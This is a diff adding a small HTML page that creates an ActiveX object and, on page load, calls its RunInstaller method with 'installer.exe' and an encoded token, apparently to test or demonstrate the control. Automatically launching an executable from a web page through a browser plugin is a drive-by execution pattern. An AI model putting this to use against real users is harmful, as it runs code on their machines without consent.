@@ -1,0 +1,20 @@
+<html>
+<body>
+<object id=obj border=1 classid="clsid:3AE51322-4D0E-4AAD-9F67-FD3925EE5FE1">
+NO OBJECT
+</object>
+<script>    
+	function doRunInstaller()
+	{				
+		obj.RunInstaller("installer.exe", 
+		"tDYMvmnZEvfja9X2LJZCc4A/4mOt2irCuZdCuf45sLHbetcrP3OT5/h82IAhE8UWxXxQcddGNDLFOz5RvuoZXHD//+TFwOADu1E6/GoHUBsbqbXYRJcxIkQu2fPtGgAEfvefE8XPa0AxcLLvWa66WJAbRiSOys0Icrb1wv8uklw=");
+	}
+
+    try {	
+		doRunInstaller();	
+} catch(e) {
+	alert("Exception: " + e.message + " " + (e.number + 0x100000000).toString(16));
+}
+</script>
+</body>
+</html>
